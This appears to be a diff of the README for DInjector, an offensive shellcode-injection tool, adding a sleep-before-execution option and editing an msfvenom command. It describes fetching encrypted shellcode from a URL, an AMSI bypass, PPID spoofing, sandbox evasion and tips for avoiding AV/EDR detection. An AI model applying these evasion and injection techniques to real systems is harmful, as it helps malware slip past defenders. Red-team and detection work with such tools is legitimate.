@@ -18,7 +18,7 @@ DInjector
                                       S H E L L C O D E
 ```
 
-This repository is an accumulation of my code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by @TheWover and @FuzzySecurity.
+This repository is an accumulation of code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by @TheWover and @FuzzySecurity.
 
 Features:
 
@@ -26,7 +26,7 @@ Features:
 * Encrypted payloads which can be invoked from a URL or passed in base64 as an argument
 * Built-in AMSI bypass
 * [PPID Spoofing](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing) and [block non-Microsoft DLLs](https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes) (stolen from [TikiTorch](https://github.com/rasta-mouse/TikiTorch), write-up is [here](https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/))
-* Sandbox detection & evasion
+* Simple sandbox detection & evasion
 
 :information_source: Based on my testings the DInvoke NuGet [package](https://www.nuget.org/packages/DInvoke/) itself is being flagged by many commercial AV/EDR solutions when incuded as an embedded resource via [Costura.Fody](https://www.nuget.org/packages/Costura.Fody/) (or similar approaches), so I've shrinked it a bit and included from [source](https://github.com/TheWover/DInvoke) to achieve better OpSec.
 
@@ -38,7 +38,7 @@ Features:
 2. Generate a shellcode of your choice:
 
 ```console
-~$ msfvenom -p windows/x64/messagebox TITLE="MSF" TEXT="Hello from DInjector" EXITFUNC=thread -f raw -o shellcode.bin
+~$ msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f raw -o shellcode.bin
 ```
 
 3. [Encrypt](encrypt.py) the shellcode:
@@ -66,6 +66,7 @@ Global arguments:
 | `/sc`       | ✔️        | `http://10.10.13.37/enc` | Sets shellcode path (can be loaded from URL or as a base64 string) |
 | `/password` | ✔️        | `Passw0rd!`              | Sets password to decrypt the shellcode                             |
 | `/am51`     | ❌        | `true`, `false`          | Applies AMSI bypass                                                |
+| `/sleep`    | ❌        | `10`, `25`               | Number of seconds (approx.) to sleep before execution              |
 
 ## Modules
 
